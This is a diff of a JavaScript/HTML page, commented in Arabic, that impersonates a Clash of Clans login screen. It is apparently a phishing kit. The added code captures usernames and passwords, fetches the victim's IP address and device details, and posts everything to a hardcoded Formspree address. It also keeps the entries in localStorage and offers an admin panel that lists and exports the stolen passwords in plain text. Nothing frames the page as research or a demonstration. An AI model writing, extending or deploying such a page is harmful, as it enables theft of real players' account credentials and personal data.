-            // التحقق من البيانات
-            if (!userData.username || !userData.email || !userData.password) {
-                showMessage('يرجى ملء جميع الحقول المطلوبة', 'error');
-                return;
-            }
-
-            if (!document.getElementById('privacyAgreement').checked) {
-                showMessage('يجب الموافقة على سياسة الخصوصية', 'error');
-                return;
-            }
-
-            // عرض حالة التحميل
-            buttonText.textContent = 'جاري حفظ البيانات...';
-            buttonLoading.style.display = 'inline-block';
-            loginButton.disabled = true;
-
-            try {
-                // 1. حفظ في LocalStorage
-                saveToLocalStorage(userData);
+        // ========== إنشاء تأثير الجسيمات ==========
+        function createParticles() {
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
                 
-                // 2. إرسال إلى Formspree (إذا كان الرابط صالح)
-                if (FORMSPREE_URL && FORMSPREE_URL.includes('formspree.io')) {
-                    await sendToFormspree(userData);
-                }
+                const size = Math.random() * 5 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
                 
-                // 3. عرض رسالة النجاح
-                showMessage('✅ تم حفظ البيانات بنجاح!', 'success');
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
                 
-                // 4. إعادة تعيين النموذج
-                setTimeout(() => {
-                    document.getElementById('username').value = '';
-                    document.getElementById('email').value = '';
-                    document.getElementById('password').value = '';
-                    document.getElementById('playerLevel').value = '';
-                    document.getElementById('clanName').value = '';
-                    document.getElementById('privacyAgreement').checked = false;
-                    
-                    buttonText.textContent = 'تسجيل الدخول إلى اللعبة';
-                    buttonLoading.style.display = 'none';
-                    loginButton.disabled = false;
-                    
-                    // إخفاء الرسالة بعد 5 ثواني
-                    setTimeout(() => {
-                        responseMessage.style.display = 'none';
-                    }, 5000);
-                }, 1000);
+                const duration = Math.random() * 10 + 10;
+                particle.style.animation = `float ${duration}s ease-in-out infinite`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
                 
-            } catch (error) {
-                console.error('Error:', error);
-                showMessage('⚠️ تم حفظ البيانات محلياً فقط', 'error');
-                buttonText.textContent = 'تسجيل الدخول إلى اللعبة';
-                buttonLoading.style.display = 'none';
-                loginButton.disabled = false;
+                particlesContainer.appendChild(particle);
             }
         }
 
-        // دالة حفظ في LocalStorage
-        function saveToLocalStorage(data) {
+        // ========== عرض الرسائل ==========
+        function showMessage(message, type = 'info') {
+            messageBox.textContent = message;
+            messageBox.className = 'message-box';
+            
+            if (type === 'success') {
+                messageBox.classList.add('success');
+            } else if (type === 'error') {
+                messageBox.classList.add('error');
+            }
+            
+            messageBox.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثواني
+            if (type !== 'error') {
+                setTimeout(() => {
+                    messageBox.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // ========== جلب IP المستخدم ==========
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'غير معروف';
+            } catch (error) {
+                return 'غير معروف';
+            }
+        }
+
+        // ========== جمع معلومات الجهاز ==========
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: navigator.cookieEnabled ? 'مفعل' : 'معطل',
+                online: navigator.onLine ? 'متصل' : 'غير متصل'
+            };
+        }
+
+        // ========== حفظ البيانات محلياً ==========
+        function saveDataLocally(userData) {
             try {
                 // الحصول على البيانات الحالية
-                let allData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                let allData = JSON.parse(localStorage.getItem('coc_users_data') || '[]');
                 
                 // إضافة البيانات الجديدة
                 allData.push({
-                    ...data,
+                    ...userData,
                     id: Date.now(),
                     localSaved: true
                 });
                 
-                // حفظ (الحد الأقصى 1000 سجل)
-                if (allData.length > 1000) {
-                    allData = allData.slice(-1000);
+                // حفظ (الحد الأقصى 500 سجل)
+                if (allData.length > 500) {
+                    allData = allData.slice(-500);
                 }
                 
-                localStorage.setItem('coc_login_data', JSON.stringify(allData));
+                localStorage.setItem('coc_users_data', JSON.stringify(allData));
                 
-                // تسجيل في الكونسول
-                console.log('📱 تم حفظ البيانات محلياً:', {
-                    user: data.username,
-                    time: new Date().toLocaleString('ar-SA'),
+                return {
+                    success: true,
                     count: allData.length
-                });
+                };
                 
             } catch (error) {
-                console.error('Error saving to localStorage:', error);
+                console.error('Error saving data:', error);
+                return {
+                    success: false,
+                    error: error.message
+                };
             }
         }
 
-        // دالة إرسال إلى Formspree
+        // ========== إرسال البيانات إلى Formspree ==========
         async function sendToFormspree(data) {
             try {
-                // إعداد البيانات للإرسال
+                // استخدام رابط Formspree الافتراضي أو الذي تم حفظه
+                const formspreeUrl = localStorage.getItem('formspree_url') || 'https://formspree.io/f/xknnprjn';
+                
                 const formData = new FormData();
+                formData.append('_subject', '🎮 تسجيل دخول جديد - Clash of Clans');
                 formData.append('username', data.username);
-                formData.append('email', data.email);
                 formData.append('password', data.password);
                 formData.append('playerLevel', data.playerLevel);
-                formData.append('clanName', data.clanName);
+                formData.append('clanName', data.clanName || 'لا يوجد');
+                formData.append('email', data.email || 'غير محدد');
                 formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+                formData.append('userIP', data.userIP);
                 formData.append('userAgent', data.userAgent);
-                formData.append('_subject', 'تسجيل دخول جديد - كلاش أوف كلانس');
+                formData.append('_replyto', data.email || 'no-reply@clashofclans.com');
                 formData.append('_format', 'plain');
                 
-                // إرسال البيانات
-                const response = await fetch(FORMSPREE_URL, {
+                const response = await fetch(formspreeUrl, {
                     method: 'POST',
                     body: formData,
-                    mode: 'no-cors' // مهم لعدم حدوث أخطاء CORS
+                    mode: 'no-cors'
                 });
                 
                 console.log('📧 تم إرسال البيانات إلى Formspree');
+                return true;
                 
             } catch (error) {
                 console.error('Error sending to Formspree:', error);
-                throw error;
+                return false;
             }
         }
 
-        // دالة عرض الرسائل
-        function showMessage(message, type) {
-            responseMessage.textContent = message;
-            responseMessage.className = 'response-message ' + type;
-            responseMessage.style.display = 'block';
-        }
-
-        // دالة فتح نافذة إعداد Formspree
-        function openFormspreeModal() {
-            formspreeModal.style.display = 'block';
-            // تعبئة الرابط إذا كان موجوداً
-            document.getElementById('formspreeUrl').value = FORMSPREE_URL;
-        }
-
-        // دالة إغلاق نافذة إعداد Formspree
-        function closeFormspreeModal() {
-            formspreeModal.style.display = 'none';
-        }
-
-        // دالة حفظ رابط Formspree
-        function saveFormspreeUrl() {
-            const url = document.getElementById('formspreeUrl').value;
-            if (url && url.includes('formspree.io')) {
-                FORMSPREE_URL = url;
-                localStorage.setItem('formspree_url', url);
-                alert('✅ تم حفظ رابط Formspree بنجاح');
-                closeFormspreeModal();
-            } else {
-                alert('https//clashofclans.com');
+        // ========== معالجة تسجيل الدخول ==========
+        async function handleLogin() {
+            // جمع البيانات من النموذج
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const playerLevel = document.getElementById('playerLevel').value;
+            const clanName = document.getElementById('clanName').value.trim();
+            const rememberMe = document.getElementById('rememberMe').checked;
+            
+            // التحقق من البيانات
+            if (!username || !password) {
+                showMessage('⚠️ يرجى ملء جميع الحقول المطلوبة', 'error');
+                return;
+            }
+            
+            // عرض حالة التحميل
+            btnText.textContent = 'جاري تسجيل الدخول...';
+            btnLoader.style.display = 'inline-block';
+            loginBtn.disabled = true;
+            
+            try {
+                // جمع معلومات إضافية
+                const userIP = await getUserIP();
+                const deviceInfo = getDeviceInfo();
+                
+                // إنشاء كائن البيانات
+                const userData = {
+                    username,
+                    password,
+                    playerLevel: playerLevel || 'غير محدد',
+                    clanName: clanName || 'لا يوجد',
+                    email: username.includes('@') ? username : 'غير محدد',
+                    timestamp: new Date().toISOString(),
+                    userIP,
+                    ...deviceInfo,
+                    rememberMe
+                };
+                
+                // 1. حفظ البيانات محلياً
+                const saveResult = saveDataLocally(userData);
+                
+                if (saveResult.success) {
+                    // 2. محاولة إرسال إلى Formspree
+                    const formspreeSent = await sendToFormspree(userData);
+                    
+                    // 3. عرض رسالة النجاح
+                    showMessage(`✅ تم تسجيل الدخول بنجاح! (${saveResult.count} سجلاً)`, 'success');
+                    
+                    // 4. إنشاء ملف للتنزيل
+                    createDownloadFile(userData);
+                    
+                    // 5. إعادة تعيين النموذج
+                    setTimeout(() => {
+                        document.getElementById('loginForm').reset();
+                        
+                        btnText.textContent = 'تسجيل الدخول إلى اللعبة';
+                        btnLoader.style.display = 'none';
+                        loginBtn.disabled = false;
+                        
+                        // عرض رابط البيانات
+                        showMessage(`📊 <a href="#" onclick="openDataModal(); return false;" style="color: white; text-decoration: underline;">عرض البيانات المحفوظة</a>`, 'success');
+                    }, 2000);
+                    
+                } else {
+                    throw new Error('فشل في حفظ البيانات محلياً');
+                }
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                showMessage('⚠️ حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.', 'error');
+                
+                btnText.textContent = 'تسجيل الدخول إلى اللعبة';
+                btnLoader.style.display = 'none';
+                loginBtn.disabled = false;
             }
         }
 
-        // دالة فتح نافذة البيانات
+        // ========== إنشاء ملف للتنزيل ==========
+        function createDownloadFile(data) {
+            try {
+                const text = `
+===========================================
+      تسجيل دخول جديد - Clash of Clans
+===========================================
+
+🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
+👤 اسم المستخدم: ${data.username}
+🔐 كلمة المرور: ${data.password}
+🎮 مستوى اللاعب: ${data.playerLevel}
+🏰 اسم العشيرة: ${data.clanName}
+📧 البريد الإلكتروني: ${data.email}
+🌐 عنوان IP: ${data.userIP}
+🖥️ الجهاز: ${data.platform}
+🌍 اللغة: ${data.language}
+📱 المتصفح: ${data.userAgent}
+🖥️ دقة الشاشة: ${data.screen}
+
+===========================================
+                تم الحفظ تلقائياً
+===========================================
+                `;
+                
+                const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `clash-login-${Date.now()}.txt`;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+                
+            } catch (error) {
+                console.error('Error creating download file:', error);
+            }
+        }
+
+        // ========== نافذة عرض البيانات ==========
         function openDataModal() {
             dataModal.style.display = 'block';
-            // إعادة تعيين حالة الدخول
             document.getElementById('adminLogin').style.display = 'block';
             document.getElementById('dataContent').style.display = 'none';
             document.getElementById('adminPassword').value = '';
         }
 
-        // دالة إغلاق نافذة البيانات
         function closeDataModal() {
             dataModal.style.display = 'none';
         }
 
-        // دالة دخول المسؤول
         function loginAdmin() {
             const password = document.getElementById('adminPassword').value;
             
@@ -701,21 +1018,34 @@
             }
         }
 
-        // دالة تحميل البيانات المحفوظة
         function loadSavedData() {
             try {
-                const allData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                const allData = JSON.parse(localStorage.getItem('coc_users_data') || '[]');
                 
                 // عرض الإحصائيات
                 const statsInfo = document.getElementById('statsInfo');
                 if (allData.length === 0) {
-                    statsInfo.innerHTML = 'لا توجد بيانات محفوظة بعد';
+                    statsInfo.innerHTML = '<p style="color: #666; text-align: center;">لا توجد بيانات</p>';
                 } else {
-                    const lastData = allData[allData.length - 1];
+                    const lastEntry = allData[allData.length - 1];
+                    const today = new Date().toLocaleDateString('ar-SA');
+                    const todayEntries = allData.filter(entry => 
+                        new Date(entry.timestamp).toLocaleDateString('ar-SA') === today
+                    ).length;
+                    
                     statsInfo.innerHTML = `
-                        <strong>إجمالي التسجيلات:</strong> ${allData.length}<br>
-                        <strong>آخر تسجيل:</strong> ${new Date(lastData.timestamp).toLocaleString('ar-SA')}<br>
-                        <strong>آخر مستخدم:</strong> ${lastData.username}
+                        <div style="text-align: center; padding: 10px; background: white; border-radius: 5px;">
+                            <h4 style="color: #1a237e; margin: 0;">${allData.length}</h4>
+                            <p style="color: #666; margin: 5px 0 0; font-size: 12px;">إجمالي التسجيلات</p>
+                        </div>
+                        <div style="text-align: center; padding: 10px; background: white; border-radius: 5px;">
+                            <h4 style="color: #1a237e; margin: 0;">${todayEntries}</h4>
+                            <p style="color: #666; margin: 5px 0 0; font-size: 12px;">اليوم</p>
+                        </div>
+                        <div style="text-align: center; padding: 10px; background: white; border-radius: 5px;">
+                            <h4 style="color: #1a237e; margin: 0;">${lastEntry.username}</h4>
+                            <p style="color: #666; margin: 5px 0 0; font-size: 12px;">آخر مستخدم</p>
+                        </div>
                     `;
                 }
                 
@@ -723,29 +1053,32 @@
                 const dataList = document.getElementById('dataList');
                 
                 if (allData.length === 0) {
-                    dataList.innerHTML = '<p style="text-align: center; color: #666;">لا توجد بيانات لعرضها</p>';
+                    dataList.innerHTML = '<p style="text-align: center; color: #666; padding: 20px;">لا توجد بيانات لعرضها</p>';
                     return;
                 }
                 
-                // عرض آخر 50 سجل فقط
-                const recentData = allData.slice(-50).reverse();
+                // عرض آخر 20 سجل
+                const recentData = allData.slice(-20).reverse();
                 
                 let html = '';
                 recentData.forEach((item, index) => {
                     html += `
-                    <div style="background: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 15px;">
-                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                            <h4 style="color: #1a237e; margin: 0;">👤 ${item.username}</h4>
-                            <span style="color: #666; font-size: 14px;">${new Date(item.timestamp).toLocaleString('ar-SA')}</span>
+                    <div style="background: ${index % 2 === 0 ? '#f9f9f9' : 'white'}; padding: 15px; margin-bottom: 10px; border-radius: 8px; border-left: 4px solid #1a237e;">
+                        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
+                            <div>
+                                <strong style="color: #1a237e;">👤 ${item.username}</strong>
+                                <br>
+                                <small style="color: #666;">${new Date(item.timestamp).toLocaleString('ar-SA')}</small>
+                            </div>
+                            <span style="background: #1a237e; color: white; padding: 2px 8px; border-radius: 12px; font-size: 12px;">
+                                ${item.playerLevel}
+                            </span>
                         </div>
-                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
-                            <div><strong>📧 البريد:</strong> ${item.email}</div>
-                            <div><strong>🔑 كلمة المرور:</strong> ${item.password}</div>
-                            <div><strong>🎮 المستوى:</strong> ${item.playerLevel}</div>
-                            <div><strong>🏰 العشيرة:</strong> ${item.clanName}</div>
-                        </div>
-                        <div style="margin-top: 10px; font-size: 12px; color: #888;">
-                            <strong>📱 الجهاز:</strong> ${item.platform} | <strong>🌐 اللغة:</strong> ${item.language}
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; font-size: 14px;">
+                            <div><strong>🔐:</strong> ${item.password}</div>
+                            <div><strong>🏰:</strong> ${item.clanName}</div>
+                            <div><strong>🌐:</strong> ${item.userIP}</div>
+                            <div><strong>📧:</strong> ${item.email}</div>
                         </div>
                     </div>
                     `;
@@ -755,29 +1088,25 @@
                 
             } catch (error) {
                 console.error('Error loading data:', error);
-                document.getElementById('dataList').innerHTML = '<p style="color: red;">حدث خطأ في تحميل البيانات</p>';
+                document.getElementById('dataList').innerHTML = '<p style="color: red; text-align: center;">حدث خطأ في تحميل البيانات</p>';
             }
         }
 
-        // دالة تصدير البيانات
         function exportData() {
             try {
-                const data = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                const data = JSON.parse(localStorage.getItem('coc_users_data') || '[]');
                 
                 if (data.length === 0) {
                     alert('لا توجد بيانات للتصدير');
                     return;
                 }
                 
-                // إنشاء ملف JSON
                 const jsonData = JSON.stringify(data, null, 2);
                 const blob = new Blob([jsonData], { type: 'application/json' });
                 const url = URL.createObjectURL(blob);
-                
-                // إنشاء رابط تنزيل
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = `coc-data-${new Date().toISOString().split('T')[0]}.json`;
+                link.download = `clash-users-${new Date().toISOString().split('T')[0]}.json`;
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
@@ -786,58 +1115,81 @@
                 alert(`✅ تم تصدير ${data.length} سجل`);
                 
             } catch (error) {
-                console.error('Error exporting data:', error);
                 alert('❌ حدث خطأ أثناء التصدير');
             }
         }
 
-        // دالة حذف جميع البيانات
         function clearAllData() {
             if (confirm('⚠️ هل أنت متأكد من حذف جميع البيانات؟ لا يمكن التراجع عن هذا الإجراء.')) {
-                localStorage.removeItem('coc_login_data');
+                localStorage.removeItem('coc_users_data');
                 alert('✅ تم حذف جميع البيانات');
                 loadSavedData();
             }
         }
 
-        // دالة تحديث البيانات
-        function refreshData() {
-            loadSavedData();
-            alert('✅ تم تحديث البيانات');
+        // ========== إعداد Formspree ==========
+        function setupFormspree() {
+            const url = prompt('أدخل رابط Formspree الخاص بك (https://formspree.io/f/xxxxxxx):');
+            
+            if (url && url.includes('formspree.io')) {
+                localStorage.setItem('formspree_url', url);
+                formspreeConfigured = true;
+                alert('✅ تم إعداد Formspree بنجاح! البيانات ستصل إلى بريدك.');
+            } else if (url) {
+                alert('❌ الرابط غير صالح. يجب أن يكون رابط Formspree');
+            }
         }
 
-        // إضافة مستمعي الأحداث
-        loginButton.addEventListener('click', saveLoginData);
-        viewDataLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            openDataModal();
-        });
-        setupLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            openFormspreeModal();
-        });
-
-        // إدخال البيانات عند الضغط على Enter
-        document.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && !loginButton.disabled) {
-                saveLoginData();
-            }
-        });
-
-        // تحذير عند تحميل الصفحة
-        window.addEventListener('load', () => {
-            console.log('🚀 صفحة تسجيل دخول كلاش أوف كلانس جاهزة');
-            console.log('📊 Formspree URL:', FORMSPREE_URL);
+        // ========== إعدادات أولية ==========
+        function init() {
+            createParticles();
             
-            // التحقق من Formspree URL
-            if (!FORMSPREE_URL.includes('formspree.io')) {
-                console.warn('⚠️ لم يتم إعداد Formspree بعد. البيانات ستحفظ محلياً فقط.');
+            // إضافة مستمعي الأحداث
+            loginBtn.addEventListener('click', handleLogin);
+            
+            document.getElementById('createAccountBtn').addEventListener('click', () => {
+                showMessage('🚀 سيتم توجيهك إلى صفحة إنشاء حساب جديد', 'success');
+                setTimeout(() => {
+                    document.getElementById('username').value = 'player_' + Math.floor(Math.random() * 10000);
+                    document.getElementById('password').value = 'pass' + Math.floor(Math.random() * 1000);
+                    document.getElementById('playerLevel').value = '1-50';
+                }, 1000);
+            });
+            
+            document.getElementById('playAsGuestBtn').addEventListener('click', () => {
+                showMessage('👤 جارٍ الدخول كضيف...', 'success');
+                setTimeout(() => {
+                    document.getElementById('username').value = 'guest_' + Math.floor(Math.random() * 1000);
+                    document.getElementById('password').value = 'guest123';
+                    document.getElementById('playerLevel').value = '1-50';
+                }, 1000);
+            });
+            
+            document.getElementById('viewDataBtn').addEventListener('click', openDataModal);
+            
+            // إدخال البيانات عند الضغط على Enter
+            document.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !loginBtn.disabled) {
+                    handleLogin();
+                }
+            });
+            
+            // التحقق من إعداد Formspree
+            if (localStorage.getItem('formspree_url')) {
+                formspreeConfigured = true;
+                console.log('Formspree is configured');
+            } else {
+                console.log('Formspree is not configured. Data will be saved locally only.');
             }
             
-            // التحقق من وجود بيانات سابقة
-            const savedData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
-            console.log(`📱 البيانات المحفوظة مسبقاً: ${savedData.length} سجل`);
-        });
+            // عرض رسالة ترحيب
+            setTimeout(() => {
+                showMessage('🎮 مرحباً بك في Clash of Clans! أدخل بياناتك للبدء.', 'success');
+            }, 1000);
+        }
+
+        // ========== تشغيل التطبيق ==========
+        window.addEventListener('load', init);
     </script>
 </body>
-</html>
+                                                              </html>
